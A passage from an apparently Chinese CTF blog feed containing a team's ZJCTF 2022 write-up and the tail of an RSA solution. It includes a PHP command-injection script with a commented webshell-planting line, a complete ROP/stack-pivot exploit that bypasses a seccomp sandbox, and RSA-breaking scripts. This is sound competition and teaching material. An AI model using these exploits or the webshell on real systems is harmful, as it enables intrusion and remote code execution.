y$，则总存在 $i$ 使得 $x$ 和 $y$ 在模 $n_i$ 下不同余。</p><p><strong>故系数列表 ${a_i}$ 与解 $x$ 之间是一一映射关系，方程组总是有唯一解。</strong></p><h4 id="解题脚本-4"><a href="#解题脚本-4" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">e1=<span class="number">14606334023791426</span></span><br><span class="line">p1=<span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1=<span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1=<span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line"></span><br><span class="line">e2=<span class="number">13813369129257838</span></span><br><span class="line">p2=<span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2=<span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2=<span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br><span class="line">n2=p2 * q2</span><br><span class="line">phi1=(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2=(p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d1=inverse(e1,phi1)</span><br><span class="line">d2=inverse(e2,phi2)</span><br><span class="line">res1=<span class="built_in">pow</span>(c1,d1,p1*q1)</span><br><span class="line">res2=<span class="built_in">pow</span>(c2,d2,p1*q2)</span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">res1%q1=m^14%q1</span></span><br><span class="line"><span class="string">res2%q2=m^14%q2</span></span><br><span class="line"><span class="string">res1%p=m^14%p</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a1=res1%q1</span><br><span class="line">a2=res2%q2</span><br><span class="line">a3=res1*res2%p1</span><br><span class="line">n=p1*q1*q2</span><br><span class="line">n1=n//q1</span><br><span class="line">n2=n//q2</span><br><span class="line">n3=n//p1</span><br><span class="line">m1=inverse(n1,q1)</span><br><span class="line">m2=inverse(n2,q2)</span><br><span class="line">m3=inverse(n3,p1)</span><br><span class="line">res=(n1*m1*a1+n2*m2*a2+n3*m3*a3)</span><br><span class="line">n=q1*q2</span><br><span class="line">e=<span class="number">14</span></span><br><span class="line">c=res%n</span><br><span class="line">phi=(q1-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(res,d,n)</span><br><span class="line">l=iroot(m,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(l[<span class="number">0</span>])))</span><br><span class="line"><span class="comment">#flag&#123;gcd_e&amp;φ_isn&#x27;t_1&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浙江省2022省赛write up</title>
      <link href="/2022/09/24/ZJCTF-2022/"/>
      <url>/2022/09/24/ZJCTF-2022/</url>
      
        <content type="html"><![CDATA[<p>久违的题解来啦！！！</p><span id="more"></span><h1 id="沙耶之歌战队"><a href="#沙耶之歌战队" class="headerlink" title="沙耶之歌战队"></a>沙耶之歌战队</h1><ol><li>解题过程中，关键步骤不可省略，不可含糊其辞、一笔带过。</li><li>解题过程中如是自己编写的脚本，不可省略，不可截图（代码字体可以调小；而如果代码太 长，则贴关键代码函数）。 </li><li>您队伍所有解出的题目都必须书写WRITEUP，缺少一个则视该WRITEUP无效，队伍成绩将无 效。</li><li>WRITEUP如过于简略和敷衍，导致无法形成逻辑链条推断出战队对题目有分析和解决的能 力，该WRITEUP可能被视为无效，队伍成绩将无效。</li><li>提交PDF版本即可</li></ol><h2 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h2><ul><li>战队名：沙耶之歌</li><li>排名：3</li></ul><h2 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h2><p><img src="/2022/09/24/ZJCTF-2022/main.png" alt="main"></p><p>所有题目的附件<a href="ZJCTF-2022/ZJCTF2022.zip">👇</a></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>sqlmap一把梭，用个space2mssqlhash tamper即可。</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><table><thead><tr><th>7.1.0</th><th><a href="php/migration71.incompatible.html#migration71.incompatible.rand_srand_aliases">内置的随机数产生算法从 libc rand 函数改成 </a><a href="http://www.math.sci.hiroshima_u.ac.jp/~m_mat/MT/emt.html">» 梅森旋转</a>伪随机数生成算法。</th></tr></thead></table><p>所以可以爆破。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(time() + 1);</span><br><span class="line"><span class="meta">$</span><span class="bash">cmd=<span class="string">&#x27;ls+-al+./&#x27;</span>;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="variable">$cmd</span>=<span class="string">&#x27;echo%20PD9waHAKZWNobyAnbXFtJzsKQGV2YWwoJF9QT1NUWydjbWQnXSk7Cg==|base64%20-d&gt;mqm.php&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a = array(<span class="string">&quot;system&quot;</span>, <span class="variable">$cmd</span>);</span></span><br><span class="line">for ($i = 0; $i &lt;= 10000; $i++) &#123;</span><br><span class="line">    array_push($a, &quot;Ctfer&quot;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">shuffle($</span><span class="bash">a);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">n1 = array_search(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$n1</span> . <span class="string">&#x27;   &#x27;</span> . <span class="variable">$a</span>[<span class="variable">$n1</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">n2 = array_search(<span class="variable">$cmd</span>, <span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$n2</span> . <span class="string">&#x27;   &#x27;</span> . <span class="variable">$a</span>[<span class="variable">$n2</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">// 创建一个新cURL资源</span><br><span class="line"><span class="meta">$</span><span class="bash">ch = curl_init();</span></span><br><span class="line"></span><br><span class="line">// 设置URL和相应的选项</span><br><span class="line"><span class="meta">curl_setopt($</span><span class="bash">ch, CURLOPT_URL, <span class="string">&quot;http://1.14.97.218:21659/index.php?cmd=&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;&amp;b=&quot;</span> . <span class="variable">$n1</span> . <span class="string">&quot;&amp;c=&quot;</span> . <span class="variable">$n2</span>);</span></span><br><span class="line"><span class="meta">#</span><span class="bash">print_r(<span class="string">&quot;http://1.14.97.218:21659/index.php?cmd=&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;&amp;b=&quot;</span> . <span class="variable">$n1</span> . <span class="string">&quot;&amp;c=&quot;</span> . <span class="variable">$n2</span>);</span></span><br><span class="line"><span class="meta">curl_setopt($</span><span class="bash">ch, CURLOPT_HEADER, 1);</span></span><br><span class="line"><span class="meta">curl_setopt($</span><span class="bash">ch, CURLOPT_RETURNTRANSFER, 1);</span></span><br><span class="line">// 抓取URL并把它传递给浏览器</span><br><span class="line"><span class="meta">$</span><span class="bash">s = curl_exec(<span class="variable">$ch</span>);</span></span><br><span class="line"><span class="meta">print_r($</span><span class="bash">s);</span></span><br><span class="line">// 关闭cURL资源，并且释放系统资源</span><br><span class="line"><span class="meta">curl_close($</span><span class="bash">ch);</span></span><br></pre></td></tr></table></figure><p>然后burpsuite跑一下即可。</p><p>这题没权限写马，浪费了很多时间，可惜。</p><p>所以总结一下：一般情况下，非文件上传功能的目录都是不给 w 权限的，所以能执行命令就不要写🐎</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><h4 id="题目分析（赛后复现的赛中分析）"><a href="#题目分析（赛后复现的赛中分析）" class="headerlink" title="题目分析（赛后复现的赛中分析）"></a>题目分析（赛后复现的赛中分析）</h4><p>静态链接的 elf，逻辑比较难以分析，不过根据题目的描述选择直接 down 下来跑一下看看。</p><p><img src="/2022/09/24/ZJCTF-2022/1.png" alt="1"></p><p>发现是一个迷宫，用 wsad 上下左右移动，结果显而易见，走到出口之后打印了我们一个 flag 字符串，其它什么都没有给，但是貌似最后还有一个输入，考虑一下栈溢出，输入大量数据来确定。</p><p>为了方便调试还是选择用脚本跑掉前面的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;sssssdddwwwdddwdww&#x27;</span></span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        p.recvline()</span><br><span class="line">    p.sendline(i)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>结束之后输入大量的 a 发现 0x4017cc 的返回指令返回到 0x6171717171717171，说明我们写的 a 覆盖到了返回地址，这里我们就能劫持程序流了。</p><p><img src="/2022/09/24/ZJCTF-2022/2.png" alt="2"></p><p>反复跑脚本确定了缓冲区大小是 0x178，我们需要在 0x180 之后输入返回地址劫持。由于是静态链接，静态链接中能找到调用的 execve 函数，直接使用 gadget 调用结束。在静态链接中，想要准确的找到函数的位置基本是挺难的，但是 execve 还是比较好找的，我们直接搜 /bin/sh 字符串，然后交叉引用就能看到。</p><p><img src="/2022/09/24/ZJCTF-2022/3.png" alt="3"></p><p>就是图中 0x5cd630 函数。</p><p>然后我们补一下脚本，这里为了方便调试，我们直接把断点打在返回指令的地址。    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;sssssdddwwwdddwdww&#x27;</span></span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        p.recvline()</span><br><span class="line">    p.sendline(i)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00000000004008f6</span></span><br><span class="line">pop_rsi=<span class="number">0x000000000040417f</span></span><br><span class="line">pop_rdx=<span class="number">0x000000000051d4b6</span></span><br><span class="line">execve=<span class="number">0x5cd630</span> </span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(execve)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x4017cc&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x180</span>+payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>当我以为成功的时候</p><p><img src="/2022/09/24/ZJCTF-2022/4.png" alt="4"></p><p>发现 shell 并没有用，于是才发现这题开了沙箱保护，禁用了 execve 系统调用，因此我们的提权计划宣告失败。</p><p>那我们只能选择 orw 去读出 flag，但是当把所有的 gadget 找齐拼接好以后发现他溢出长度还有限制。</p><p>于是这个时候我只能选择栈迁移，不过栈迁移之前需要在一个确定可读可写的位置写上 rop 链才能达到目的。</p><p>这里还需要一个最终的 gadget：pop rdx ; pop rsi ; ret。不然发现长度还是不够，而我最终的 exp 则是刚刚好利用完所有的空间，这里还省了一个 pop rax ; ret，因为它程序运行到这里就直接 rax=0 了，所以这里可以省下 17 字节。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote()</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;sssssdddwwwdddwdww&#x27;</span></span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        p.recvline()</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        s+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> s&gt;<span class="number">5</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    p.sendline(i)</span><br><span class="line"></span><br><span class="line">pop_rax=<span class="number">0x0000000000400a4f</span></span><br><span class="line">syscall=<span class="number">0x00000000004025ab</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004008f6</span></span><br><span class="line">pop_rsi=<span class="number">0x000000000040417f</span></span><br><span class="line">pop_rdx=<span class="number">0x000000000051d4b6</span></span><br><span class="line">pop_rbx=<span class="number">0x0000000000402498</span></span><br><span class="line">pop_dx_si=<span class="number">0x000000000051d559</span></span><br><span class="line">buf=<span class="number">0x98a000</span></span><br><span class="line">leave=<span class="number">0x00000000004017cb</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)<span class="comment">#open</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(elf.search(<span class="string">b&#x27;flag&#x27;</span>).__next__())</span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">payload+=p64(pop_rsi)+p64(buf)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi)+p64(buf)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line">pa=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#pa=p64(pop_rax)+p64(0)</span></span><br><span class="line">pa+=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">pa+=p64(pop_dx_si)+p64(<span class="number">0x100</span>)+p64(buf+<span class="number">0x300</span>)</span><br><span class="line">pa+=p64(syscall)+p64(leave)</span><br><span class="line"><span class="comment">#pa+=p64(pop_rdx)+p64(0x100)+p64(syscall)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x4017cc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x178</span>+p64(buf+<span class="number">0x300</span>)+pa)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)<span class="comment">#orw链</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><p>赛时截图：</p><p><img src="/2022/09/24/ZJCTF-2022/5.png" alt="5"></p><p>不管怎么说，这题拿到了一个一血，还是很开心的，但是据说这题有更简单的做法，因为程序运行的时候会分配一个可读可写可执行的段，而我们可以利用这个段写 shellcode 去得到 flag，而 pwntools 自带构造 shellcode 的函数，可以让我们方便去构造 shellcode。</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="zandroid"><a href="#zandroid" class="headerlink" title="zandroid"></a>zandroid</h2><p>zip打开，找资源文件发现直接 flag 在 mipmap-xxxhpdi-v4 下面有一个 pic1.png 上面画着 flag。</p><p>我的 re 什么时候才能站起来啊，听说这次 re 异常简单，而我就是不会。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rssssa5"><a href="#rssssa5" class="headerlink" title="rssssa5"></a>rssssa5</h2><p>用sagemath跑下面的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">21795945409392994055049935446570173194131443801801845658035469673666023560594683551197545038999238700810747177248724184844583697034436178042499504967917978621708536213230969406811902366917932032050583747070735750876593573387957847683066895725722366706359818941065483471789173682177234707645138490589285500875222568286917243861325846262174331736570517513524474322519145470883352586121892275861245291051789531734179640139953079522307426687782419075644619898733819937782418589025945603603989100805717550707637938272890461763518245458692411433603442554397633470070254229240718705126327921819662662201896576503865953330533</span></span><br><span class="line">c = <span class="number">1700765718465847687738186396037558689777598727005427859690647229619648539776087318379834790898189767401195002186003548094137654979353798325221367220839665289140547664641712525534203652911807047718681392766077895625388064095459224402032253429117181743725938853591119977172518617563668740574496233135226296439754690903570240135657268737729817911404733486976376064060345507410817912670147466261149172470191719474107592103882894806322239740349433710606063058170148571050855845964674224651003832579701204330217602742005466066589981707592861990283864753628591214636813639371477417319679603330973431803849304579330791040664</span></span><br><span class="line">p = <span class="number">1426723861968217959675536598409491243380171101180592446441749834738176786277745723654950385796320682900434611832789544257790278878742420696344225394624591757752431494779</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">k=x*<span class="number">2</span>**<span class="number">560</span>+p</span><br><span class="line">k=k.monic()</span><br><span class="line"></span><br><span class="line">root = k.small_roots(X=<span class="number">2</span>^<span class="number">464</span>,beta=<span class="number">0.45</span>,epsilon=<span class="number">0.05</span>)</span><br><span class="line">p=<span class="built_in">int</span> (root[<span class="number">0</span>])*<span class="number">2</span>**<span class="number">560</span>+p</span><br><span class="line"></span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/2022/09/24/ZJCTF-2022/6.png" alt="6"></p><p>然后解下hex即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;ce73935b2e83a78aa5079a9e59ae4980&#125;</span><br></pre></td></tr></table></figure><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>思路大概就是对每一个操作求逆，直接跑个脚本完事</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;</span></span><br><span class="line">n=<span class="number">176778040837484895481963794918312894811914463587783883976856801776290821243853364789418908640505211936881707629753845875997805883248035576046706978993073043757445726175605877196383212378074705385178610178824713173854530726380795438083708575717562524587045312909657881223522830729052758566504582290081411726333</span></span><br><span class="line">m=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key=n-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    k=((<span class="built_in">str</span>.index(i)-<span class="number">7</span>)*inverse(key,<span class="number">37</span>))%<span class="number">37</span></span><br><span class="line">    m+=<span class="built_in">str</span>[k]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/2022/09/24/ZJCTF-2022/7.png" alt="7"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>拿到发现是两张图片整合而成的，分离图片时发现中间有一串gift，刚开始以为是base64，怎么试都还是错的，后来才发现不是，最后拿去解码拿到flag</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_12-47-06.png" alt="Snipaste_2022-09-24_12-47-06"></p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_10-09-08.png" alt="Snipaste_2022-09-24_10-09-08"></p><h2 id="m4a"><a href="#m4a" class="headerlink" title="m4a"></a>m4a</h2><p>拿到一个没有后缀的文件</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_12-52-16.png" alt="Snipaste_2022-09-24_12-52-16"></p><p>拖入010发现文件末尾有疑似压缩包关键字</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-25-37.png" alt="Snipaste_2022-09-24_13-25-37"></p><p>但是好像是倒着的，用瑞士军刀倒回来</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-32-00.png" alt="Snipaste_2022-09-24_13-32-00"></p><p>保存下来准备打开，但是显示损坏</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-33-23.png" alt="Snipaste_2022-09-24_13-33-23"></p><p>用WinRAR修复一下得到一个完整的压缩包</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-49-08.png" alt="Snipaste_2022-09-24_13-49-08"></p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-49-19.png" 